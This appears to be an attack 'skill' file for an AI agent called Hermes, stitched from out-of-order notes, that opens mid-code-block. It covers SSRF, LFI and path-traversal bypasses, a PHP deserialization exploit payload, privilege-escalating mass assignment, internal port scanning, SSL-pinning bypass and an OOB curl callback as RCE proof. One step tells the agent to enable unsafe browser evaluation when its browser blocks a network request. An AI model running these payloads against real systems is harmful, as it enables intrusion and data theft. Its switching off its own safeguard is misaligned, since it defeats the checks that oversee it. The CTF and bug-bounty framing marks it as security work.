# 127.0.0.1 → 7f000001
```

**B) Parameter pollution on test** — override the saved URL during test:
```bash
# Save whitelisted URL first
POST /webhook {"url": "http://8.8.8.8/"}
# → "Webhook saved"

# Then test with overridden URL (may bypass re-validation)
POST /webhook {"test_webhook": "1", "url": "http://127.0.0.1:8000/"}
# Some servers process test BEFORE save, so the new URL is used without validation
```

**C) URL parser confusion** — credentials in URL:
```bash
# PHP parse_url vs curl may disagree on the host
http://8.8.8.8@127.0.0.1:8000/   # parse_url sees 8.8.8.8, curl may connect to 127.0.0.1
http://127.0.0.1:8000@8.8.8.8/   # reverse ordering
```

**D) IPv4-mapped IPv6:**
```bash
http://[::ffff:8.8.8.8]:8000/      # IPv6 representation of 8.8.8.8
http://[::ffff:7f00:1]:8000/       # IPv6 representation of 127.0.0.1
```

**E) Alternative IP notations (if only blocked via dotted-quad blacklist):**
```bash
http://0/                          # zero
http://127.1/                      # short localhost
http://2130706433/                 # decimal 127.0.0.1
http://0x7f000001/                 # hex
http://0177.0.0.1/                 # octal
http://127.0.0.2:8000/             # 127.0.0.2 also reaches localhost
```

**F) Whitelisted-IP-with-custom-port:** If port 53 is open on the whitelisted host, the TCP connection succeeds but HTTP fails with "Empty reply from server." This doesn't help with the next level but confirms the server can reach the whitelisted IP range.



## Checklist
- [ ] Bypass app restrictions (SSL pinning, auth, etc.)
- [ ] Fuzz for hidden endpoints (registration, upload, download)
- [ ] Register account if possible
- [ ] Enumerate all user flows in authenticated state
- [ ] Test file download endpoints for LFI
- [ ] Test URL/image/map features for SSRF
- [ ] Try cloud metadata endpoints for SSRF
- [ ] Test all input vectors for stored XSS
- [ ] **SSRF: scan ALL internal ports (not just 80/443) — port 8000 is common**
- [ ] **SSRF: grep response for `data:text/html;base64,` patterns — decode to see fetched content**
- [ ] **SSRF: test HTTP protocol (HTTPS may be blocked while HTTP works)**
- [ ] **SSRF: test POST-to-GET semantics (client POSTs URL, server GETs it)**
- [ ] **SSRF: trigger stack traces via array syntax on parameters (`?param[]=value`)**
- [ ] **SSRF: test mixed array+scalar parameter ordering (first vs last wins)**
- [ ] **LFI: test XXE injection with XML content-type (file:// read)**
- [ ] **PHP deserialization: craft serialized objects with private property prefixes (`\0ClassName\0prop`; count null bytes in length!)**
- [ ] **Mass assignment: add extra parameters to POST forms (role, is_admin, privilege, etc.)**
- [ ] **Webhook/SSRF: try DNS rebinding, URL parser confusion, and parameter pollution to bypass IP whitelists**
- [ ] **JSON duplicate key bypass: PHP json_decode uses LAST key — pass access-control check with first key, execute admin op with second key** `{"op":"getUser","op":"getUsers","id":1}`
- [ ] **"Give me" endpoint bypass: endpoints like `/give_me` may be blocked from direct access (403) but accessible via browser JS (AJAX/fetch), SSRF, or by modifying request method/headers**
  - **Intended solution = browser console fetch:** The server checks `Referer` header — direct URL-bar navigation has no Referer. Using `fetch()` from the page's own JavaScript context sends the correct `Referer: https://target.com/level-path/` automatically, and the URL bar never changes.
  - **How to test in Hermes:**
    1. Navigate to the page that links to `/give_me`
    2. Open browser console and run:
       ```javascript
       fetch('/level-path/give_me').then(r=>r.text()).then(t=>document.body.innerText=t)
       ```
    3. If fetch is blocked ("sensitive browser JavaScript primitive (network request)"), enable unsafe evaluation:
       ```bash
       hermes config set browser.allow_unsafe_evaluate true
       ```
    4. Then retry — the response text replaces the page content (no navigation, URL bar unchanged)

    ```
  - ⚠️ **Cloudflare WAF limitation:** If Cloudflare returns 403 for the path, SSRF may also fail because:
    1. **External HTTP →** goes through Cloudflare → redirects to HTTPS (301) or hits WAF (403)
    2. **Internal Apache →** does NOT have the routing rules → returns 404
    3. **Actual nginx routing** sits between Cloudflare and Apache — only Cloudflare-triggered requests go through nginx's rewrite rules
    In this architecture, Cloudflare-blocked endpoints are unreachable from both outside AND inside the server, unless you can reach nginx directly (bypassing Cloudflare) via its origin IP or internal port.
- [ ] **CTF note enumeration: base64-encode IDs and iterate (note 100+ often contains next path)**
- [ ] **Check `?show-source` or `?source` to reveal PHP source code with vulnerability hints**

---
# Merged from: hunt-lfi

# HUNT-LFI — Local / Remote File Inclusion & Path Traversal



## 9. SSRF Protocol Bypass — HTTP Works, HTTPS Blocked

Many SSRF implementations filter URLs but only block HTTPS (because curl/backend can't terminate TLS):

```bash
# HTTPS external → "Could not fetch" (blocked)
# HTTP external → WORKS (example.com loads!)
# HTTP internal → WORKS (127.0.0.1, localhost)
```

**Bug bounty application:** Always test BOTH http:// and https:// — the filter may only block one protocol.



## Named CVEs / Public Techniques (grounding)

Verified, correctly-attributed references for the patterns above:
- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
- **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
- **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
- **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.

> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.




## 5. The Mindset

> "ثغرات مو تخطيات دائما... الاختراق ذكاء"

- Vulns aren't just techniques — you need **intelligence to reach the code path**
- A simple bypass can unlock critical bugs
- **Persistence wins**: fuzz for hours, don't lose hope when tired
- Sometimes the method is simple but the discovery took hours of fuzzing



## Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**

## 2. Fuzzing for Hidden Endpoints

When you find an entry point (like `/cms/login`), fuzz for siblings:

```bash
# If /cms/login exists, fuzz for other /cms/ paths
ffuf -u "https://target.com/cms/FUZZ" -w /usr/share/wordlists/discovery/common.txt -fc 404

# Common hidden gems:
# /cms/Registeruser  → register an account!
# /cms/upload
# /cms/download
# /cms/export
# /cms/import
# /cms/api
```

**Key insight:** Self-registration endpoints are gold — they give you authenticated access without needing credentials.



## 7. SSRF Stack Trace Trigger via Array Syntax

When a PHP endpoint expects a scalar parameter but receives an ARRAY, it may crash with a stack trace that reveals:
- Full server file paths
- Hardcoded function arguments (including secrets/paths)
- Application structure

```bash
# Trigger TypeError: trim() expects string, array given
curl -sk "https://target.com/page?referral[]=test"
# Response contains:
# Stack trace:
# #2 index.php(25): applyReferral(Array, '/next-level-path')
```

**Key insight:** The hardcoded second argument often contains the next resource path or secret.

**If stack trace is suppressed (0-byte response / display_errors=Off):**
- Try triggering via INTERNAL request through SSRF (internal requests may NOT suppress errors)
- Try POST vs GET — some servers handle errors differently per method



## Scripts

- `scripts/dns-rebind-hex.py` — Generate DNS rebinding domain names and URLs from two IP addresses. Converts dotted-quad IPs to hex, outputs rbndr.us format, HTTP/HTTPS URLs, reverse format, and the generator page link.



## 14. PHP Deserialization

### Finding vulnerable code

Look for `?show-source` or `?source` query params on the challenge page. The source may reveal `unserialize()` calls:

```php
$obj = @unserialize(file_get_contents('php://input'));
```

### Crafting the exploit payload

For private properties, serialize with null-byte-prefixed keys:

```python
# O:7:"LevelUp":2:{
#   s:16:"\x00LevelUp\x00message";s:0:"";
#   s:17:"\x00LevelUp\x00showNext";b:1;
# }
payload = b'O:7:"LevelUp":2:{s:16:"\x00LevelUp\x00message";s:0:"";s:17:"\x00LevelUp\x00showNext";b:1;}'
r = requests.post(url, data=payload)
```

**Key length calculation (critical):** For private props, the key includes null bytes:
- `\x00LevelUp\x00message` = 16 chars → `s:16:`
- `\x00LevelUp\x00showNext` = 17 chars → `s:17:`



## 3. LFI via File Download/Export

After getting authenticated access:

```bash
# Find any endpoint that serves files (CSV, PDF, images, reports)
# Test path traversal
GET /cms/download?file=../../../etc/passwd
GET /cms/export?path=../../../etc/passwd
GET /api/v1/reports/csv?template=../../../etc/passwd

# CSV download endpoints are especially vulnerable
```



## 6. SSRF Base64 Data URI Response Pattern

When SSRF results are embedded in the page as base64 data URIs:

```html
<img src='data:text/html;base64,PCFET0NUWVBFIGh0bWw+...' alt='Fetched preview'>
```

Always grep for `data:text/html;base64,` and `data:text/plain;base64,` patterns. Decode the base64 to see what the server fetched.

```python
m = re.search(r'data:text/html;base64,([^\'"]+)', response.text)
html = base64.b64decode(m.group(1)).decode('utf-8', errors='replace')
```



## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` once | `....//` or `..../\` (re-forms `../` after strip) |
| URL-decodes once | `%252f` (double-encode `/`), `%252e` for dots |
| Decodes once, blocks `..` | Encode dots: `%2e%2e%2f` / overlong `%c0%ae` (legacy) |
| Appends `.php` to input | `?` or `#` truncation; null byte `%00` (PHP < 5.3.4) |
| Blocks `php://` scheme | try `PHP://`, `pHp://`, or `data://` / `expect://` |
| Prepends fixed base dir | enough `../` to escape; or absolute path if no base prepend |
| Blocks `/etc/passwd` literal | path-truncation, `/etc/./passwd`, `/etc//passwd` |
| WAF on long filter-chains | move chain to POST body / minimize payload |
| Windows | `..\..\..\windows\win.ini`, `..%5c..%5c` |




## 8. SSRF Port Scanning Methodology

When SSRF works on localhost (127.0.0.1:80), scan ALL ports to find hidden internal services:

```python
for port in range(1, 10001):
    r = requests.post(url, data={"url": f"http://127.0.0.1:{port}/"})
    if "Could not fetch" not in r.text:
        print(f"Port {port} is OPEN!")
```

**Response patterns to detect services:**
- `"Could not fetch"` → Connection refused (port closed)
- `<img src='data:...'>` → Service responded
- Different content-type (text/plain vs text/html) → different service types
- Same response for ALL paths → static/fixed-text service

**Common hidden ports to check:** 8000, 8080, 3000, 5000, 9000, 9101



## 1. Mobile App SSL Pinning Bypass (No Jailbreak)

### The Problem
Modern apps have SSL pinning that blocks Burp Suite traffic.

### The Bypass (from real report)
```
1. Disconnect proxy from device
2. Open the feature/service inside the app (loads without interception)
3. Reconnect proxy
4. Refresh the page
5. All API requests now appear in proxy! 😎
```
**Why it works:** The app establishes the SSL session without the proxy first, then the proxy can intercept subsequent requests once the pinned session is established.



## 13. Mass Assignment / HTTP Parameter Pollution

When a form says something like "remembers everything you hand it":

```bash
# Start with normal request
curl -sk "https://target.com/register" -d "username=test"
# → "Registered as 'test' with role 'user'"

# Add role parameter to escalate privileges
curl -sk "https://target.com/register" -d "username=test&role=admin"
# → "Registered as 'test' with role 'admin'"
```

**Key parameters to guess:** `role`, `is_admin`, `user_role`, `account_role`, `privilege`, `type`, `access_level`, `permission`, `superuser`, `admin`

**Check for redirects on success** — the Location header may contain the next-level path:
```python
r = requests.post(url, data={"username": "teradmin", "role": "admin"},
                  allow_redirects=False)
# Location: /next-level-path
```



## 11. PHP Parameter Parsing — Mixed Array + Scalar

PHP handles mixed array+scalar parameters differently based on ORDER:

```bash
?note[]=MQ&note=Mg  → string wins (normal execution, returns note 2)
?note=Mg&note[]=MQ  → array wins (PHP crash, 0-byte response)
```

**Bug bounty application:** Test BOTH orderings to understand parameter handling and trigger different code paths.

### XXE + SSRF Chaining Note

When XXE entity content flows into a subsequent validation step (e.g., entity value becomes the `url` parameter of a webhook save), the LFI/RFI result is NOT displayed directly — it enters the application's validation pipeline. Use XXE to:

1. **Read files:** The entity value replaces the expected input (shows up in error messages or reflected output)
2. **SSRF via XXE:** The XML parser may resolve `SYSTEM "http://..."` URLs, making internal HTTP requests that the application layer doesn't validate
3. **OOB exfiltration:** Pipe file content to a URL parameter via nested entities (needs an external listener)



## References

See `references/ctf-stacktrace-and-deserialization.md` for detailed payloads, string-length calculations, and session-specific reproduction steps.

See `references/podbox-video-download-chain.md` for PodBox video API access-control testing (info disclosure without auth, version-gated /link endpoint, CDN without authentication).

## webhacklist 2024-2026 updates

- **Novel SSRF via HTTP Redirect Loops** — 2025 #3. Server follows attacker-controlled redirects cyclically to reach internal/metadata. Test: `Location:` header pointing at an internal URL, loop flowers.
- **SSRF Cross-Protocol Redirect Bypass** — 2023. Redirect chain flips scheme (http→gopher/http) past a scheme allowlist.
- **SNI proxy misconfig → SSRF** — 2022. Proxy routes by TLS SNI (not Host). Test: `curl --resolve target:443:IP` + SNI override.
- **FFmpeg as SSRF/OOB gadget** — 2026 (`Your House Has an FFmpeg Problem`). Any upload feeding FFmpeg (video/thumb) can fetch attacker URLs. Test: crafted media with `http://` in metadata triggers outbound.
- **APIM→AI Foundry credential-relay SSRF** — 2026 watchlist (CVE-2026-26118). Credential and destination resolve independently → user input reaches outbound request carrying a Managed Identity token with no destination validation.
